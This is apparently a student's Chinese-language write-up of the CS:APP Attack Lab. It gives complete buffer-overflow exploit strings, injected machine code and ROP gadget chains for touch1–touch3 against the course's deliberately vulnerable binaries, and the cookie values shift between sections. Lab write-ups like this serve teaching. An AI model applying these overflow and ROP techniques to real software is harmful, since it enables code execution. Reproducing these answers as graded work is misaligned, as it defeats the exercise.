# Attack Lab

之前拖了一会儿作业，要去世了，现在补上吧

## touch1

这里是先执行test函数，然后退出。

但是要不执行完test，而去执行touch1

![image-20210504003846993](https://raw.githubusercontent.com/EaKal-7/Images/main/8sHPYmoVcapCBGu.png)

```c
unsigned int __cdecl getbuf()
{
  char buf[40]; // [rsp+0h] [rbp-28h] BYREF

  Gets(buf);
  return 1;
}
```

显然这里buf只开了40的内存，所以直接使用字符串攻击

```
.text:00000000004017C0 ; void __cdecl touch1()
```

所以使溢出的地址为touch1的地址即可（这里需要注意这个程序是小端的地址要倒写

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
c0 17 40 00
```

## touch2

这道题我一开始没看懂，一开始一直以为是参数压栈的方式来攻击，发现我多少有点大病，然后去看了一眼blog.，大致上的画了一张图。

![image-20210507154651560](https://raw.githubusercontent.com/EaKal-7/Images/main/ROENfpWoJuQM6Td.png)

大致上是这么一个意思

将

```
movq $0x59b997fa,%rdi
pushq  $0x4017ec
ret
//转变为机械码
0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
9:	68 ec 17 40 00       	pushq  $0x4017ec
e:	c3                   	retq  
```

所以攻击序列为

```
48 c7 c7 fa
97 b9 59 68
ec 17 40 00
c3 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
78 dc 61 55
```

# touch3

![image-20210507154847522](https://raw.githubusercontent.com/EaKal-7/Images/main/IFfTnwOvuhA4XY2.png)

不难发现传入了一个参数这个参数与cookie进行了比较

![image-20210507155718748](https://raw.githubusercontent.com/EaKal-7/Images/main/Wq5MHs2z9YSubPK.png)

从汇编里可以发现了在touch3的开始将sval值设置成rdi，说明rdi是存放参数地址的那个寄存器。（PS：这里要求cookie是个字符串的所以要存在栈里）

所以有了以下攻击序列：

![image-20210507162145452](https://raw.githubusercontent.com/EaKal-7/Images/main/qy6FemW9Jzrhguf.png)

然后就mad显而易见的错误了，这里看到

![image-20210507162217555](https://raw.githubusercontent.com/EaKal-7/Images/main/kXhK5dj9LSGms3v.png)

在touch3里面有一个函数申请了110的空间，我直接az了，然后就有了下面这张

![image-20210507162313534](https://raw.githubusercontent.com/EaKal-7/Images/main/V4NvTFGZA7Pzc5K.png)

攻击序列：

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 
00 00 00 00
```

ROP:

问了一些别的师傅，我一开始是不了解ROP的；

ROP简单来说有两个特性：

1.栈随机

2.栈只可读

 ## touch2:



![image-20210507162618951](https://raw.githubusercontent.com/EaKal-7/Images/main/UgaJkWCj8xqOQtS.png)

这里说明需要从Gadget中找到对应的片段来进行攻击就行了：

（然后悄悄地看了眼达不溜屁，

可以找到两个满足条件的gadget

```
popq     %rax
ret                  
mov      %rax,%rdi
ret
```

这里将rax出栈赋值成cookie，然后复制给rdi

于是攻击字符串为：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
2d 1a 40 00 00 00 00 00 	//gadget1的起始地址
00 16 fb 73 00 00 00 00     //cookie
41 1a 40 00 00 00 00 00     //gadget2的起始地址
67 18 40 00 00 00 00 00     //touch2 的起始地址
```

## ROP touch3

这个我是真的没找到我直接看blog的，下面贴出所找到的指令：

```
mov   %rsp,%rax
ret
mov   %rax,%rdi
ret
popq  %rax         
ret                 
movl  %eax,%edx
ret
movl  %edx,%ecx
ret
movl  %ecx,%esi
ret
lea   (%rdi,%rsi,1),%rax
ret
mov   %rax,%rdi
ret
```

先把`%rsp`存储的栈顶指针值复制给`%rdi`， 再将`%eax`的值设置为`cookie`字符串地址在栈中的偏移量并复制给`%esi`，最后将二者相加即为`cookie`字符串的存储地址。当指令指到ret指令行时，说明一个函数已经结束了，这时候%rsp已经从被调用函数的栈指到了调用函数构建的返回地址位置。
所以当执行第一条指令时，%rsp指向当前栈顶即存储下一条指令的地址，而后面的指令执行完后最终不会使该%rsp值改变。
在第一条指令之后即从第二条指令开始，cookie字符串之前还有有9条指令，共占有72个字节即0x48字节，此即cookie字符串的地址在栈中的偏移量。

攻击字符串：

```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
//以上（任意字节除0x0a）填充满整个缓冲区（56字节）以致溢出。
b7 1a 40 00 00 00 00 00 
//用gadget1的起始地址覆盖掉原先的返回地址。
41 1a 40 00 00 00 00 00  //gadget2的起始地址。
2d 1a 40 00 00 00 00 00  //gadget3的起始地址。
48 00 00 00 00 00 00 00  //cookie字符串地址在栈中的偏移量。
53 1a 40 00 00 00 00 00  //gadget4的起始地址。
a9 1a 40 00 00 00 00 00  //gadget5的起始地址。
ca 1a 40 00 00 00 00 00  //gadget6的起始地址。
4c 1a 40 00 00 00 00 00  //gadget7的起始地址。
41 1a 40 00 00 00 00 00  //gadget8的起始地址。
75 19 40 00 00 00 00 00  //touch3 的起始地址。
37 33 66 62 31 36 30 30  //cookie字符串的字节表示。
```

完结撒花

PS：最近在写BUU的WP，所以有点拖拉，尽量在近期将BUU的WP发出来，博客搞搞完。
PPS：最近MD文件换了个图床，结果Github不能用，所以又换回了GIT的图床，真费劲。
